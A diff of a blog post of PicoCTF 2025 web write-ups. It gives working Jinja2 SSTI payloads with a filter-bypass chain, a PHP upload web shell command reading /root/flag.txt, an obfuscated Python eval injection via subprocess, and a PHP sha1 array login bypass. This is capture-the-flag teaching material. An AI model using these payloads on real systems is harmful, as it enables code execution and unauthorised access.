@@ -1,13 +1,14 @@
 ---
-title: PicoCTF2025
-date: '2025-02-01'
+title: 'PicoCTF 2025'
+date: '2025-04-01'
+tags: ['picoCTF', 'picoCTF-2025']
 draft: false
-summary: Writeup
-layout: PostBanner
-images: ['/static/images/pico.jpg']
+summary: 'Writeups for the web challenges in PicoCTF 2025, including SSTI, RCE, and filter bypasses.'
+images: ['/static/images/canada/mountains.jpg', '/static/images/canada/toronto.jpg']
+authors: ['default']
 ---
 
-Here you'll find writeups for how I solved the challenges from PicoCTF 2025, across all categories — from web and pwn to reverse engineering, crypto, and more.
+Here you'll find writeups for how I solved the challenges from PicoCTF 2025, across all categories — from web and pwn to reverse engineering, crypto, and more.  
 Each writeup includes my thought process, techniques, and the final solution.
 
 <TOCInline
@@ -19,31 +20,31 @@ Each writeup includes my thought process, techniques, and the final solution.
 
 ## SSTI1
 
-From the challenge title, it's clear that we're dealing with **Server-Side Template Injection (SSTI)**. By testing a few payloads, we can identify the template engine being used.
+From the challenge title, it's clear we're dealing with **Server-Side Template Injection (SSTI)**. I tested various payloads to identify the template engine.
 
-## Identifying the Template Engine
+### Identifying the Template Engine
 
-Here are some basic payloads for different template engines:
+Here are some common payloads for SSTI engine identification:
 
 ![template-decision-tree](/static/images/pico2025/template-decision-tree.png)
 
-After testing these, the one that works is `{{ 7*7 }}`, which returns `7777777`, confirming the engine is **Jinja2**.
+The payload `{{ 7*7 }}` returned `7777777`, confirming the engine is **Jinja2**.
 
-## Exploitation
+### Exploitation
 
-To confirm command execution, I tried:
+To confirm command execution:
 
 ```jinja
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
 ```
 
-It works! Then I proceed to read the flag:
+Then I used:
 
 ```jinja
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
 ```
 
-And successfully retrieve the flag.
+And successfully retrieved the flag.
 
 > Reference: [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)
 
@@ -51,69 +52,135 @@ And successfully retrieve the flag.
 
 ## SSTI2
 
-In the second challenge, the vulnerability is confirmed using:
+The vulnerability was confirmed using:
 
 ```jinja
 {{ 7 * '7' }}
 ```
 
-Which returns: `7777777`  
-This again confirms an SSTI vulnerability.
+Which returned `7777777`.
 
-## Bypassing Filters
+### Bypassing Filters
 
-I found this obfuscated payload that bypasses filters and still achieves code execution:
+This obfuscated payload bypasses filters and executes code:
 
 ```jinja
 {{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('id') | attr('read')() }}
 ```
 
-Then I modify it to read the flag:
+To read the flag:
 
 ```jinja
 {{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('cat flag') | attr('read')() }}
 ```
 
-> Reference: [Server Side Template Injection with Jinja2 - OnSecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
-
-> Helpful source: [SSTI Server Side Template Injection - Medium](https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038)
+> Reference: [SSTI with Jinja2 - OnSecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
+> Helpful: [SSTI - Medium](https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038)
 
 ---
 
 ## n0s4n1ty 1
 
-This challenge is vulnerable to uploading `.php` files instead of images. I simply inject PHP code to open a shell. (See the reference link below for a sample reverse shell.)
+This challenge allowed uploading `.php` files disguised as images. I injected a PHP reverse shell into the file.
 
-I know uploaded files are stored in `/uploads`, so I execute the command:
+Uploaded to `/uploads/index.php`, then triggered command execution with:
 
 ```
 /uploads/index.php?cmd=sudo cat /root/flag.txt
 ```
 
-- `index.php` is the name of my uploaded file.
-- I assumed the flag was in `/root`, which turned out to be correct.
-
-> Helpful source: [Simple PHP reverse shell](https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d)
+> Helpful: [Simple PHP reverse shell](https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d)
 
 ---
 
 ## HEAD-DUMP
 
-This challenge gives a pretty useful hint in the description: exploit the blog API.
+The app includes an API GUI in one article. Among the documented endpoints, `/headdump` dumps memory contents.
 
-```txt
-The application is a simple blog website where you can read articles about various topics, including an article about API Documentation.
+![API Docs](https://blog.qz.sg/content/images/size/w1000/2025/03/head-dump-apidocs.webp)
+![Memory Dump](https://blog.qz.sg/content/images/2025/03/head-dump-headdump.webp)
+
+I downloaded the dump and ran:
+
+```bash
+grep -E "picoCTF{.*}" heapdump-*.heapsnapshot
 ```
 
-Among the articles, you’ll find a link to the API GUI. We know the flag is stored in the server memory, so we use the final GET request in the list.  
-Accessing the corresponding URL, we download the file and find the flag.
+Which revealed the flag.
 
 ---
 
-# BINARY EXPLOITATION
+## Cookie Monster Secret Recipe
 
-## Soon
+After attempting login with `admin:password`, I noticed a cookie named `secret_recipe`.
 
-# FORSENSICS
+![App Screenshot](https://blog.qz.sg/content/images/2025/03/cookie_monster_secret_recipe-site.webp)
+![Cookie Screenshot](https://blog.qz.sg/content/images/2025/03/cookie_monster_secret_recipe-cookie.webp)
 
-## Soon
+The cookie is base64-encoded. I decoded it using CyberChef to get the secret.
+
+---
+
+## 3vl1
+
+This challenge is a calculator using `eval()` to process inputs. From the HTML source:
+
+![Source Code](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*K1HYLTpExgKko7Apz3SRGw.png)
+
+1. Dynamically import subprocess:
+
+   ```python
+   __import__('subprocess')
+   ```
+
+2. Use `getattr()` to avoid detection:
+
+   ```python
+   getattr(__import__('subprocess'), 'check_output')
+   ```
+
+3. Obfuscate command with `chr()`:
+
+   ```python
+   chr(99)+chr(97)+chr(116)  # "cat"
+   chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)  # "/flag.txt"
+   ```
+
+4. Final payload:
+
+   ```python
+   getattr(__import__('subprocess'), 'check_output')(['cat', '/flag.txt'])
+   ```
+
+Executed through the input field to read the flag.
+
+---
+
+## Aprite Sesamo
+
+We're blocked from logging in. But devs left clues suggesting backup file extensions like `.old`, `.backup`, `~`.
+
+We exploit PHP’s weak typing and `sha1()` behavior with arrays. Send POST data as arrays:
+
+```
+username[]=123&pwd[]=456
+```
+
+This makes:
+
+```php
+$yuf85e0677 = $_POST['username']; // Array
+$rs35c246d5 = $_POST['pwd'];     // Array
+```
+
+Then `sha1(array)` returns `null`. So:
+
+```php
+sha1($yuf85e0677) === sha1($rs35c246d5)
+```
+
+Evaluates to `null === null`, which is `true`.
+
+Login bypassed.
+
+![Login Trick](https://miro.medium.com/v2/resize:fit:720/format:webp/1*wBfignfXwwRhmRRa84AHiw.png)
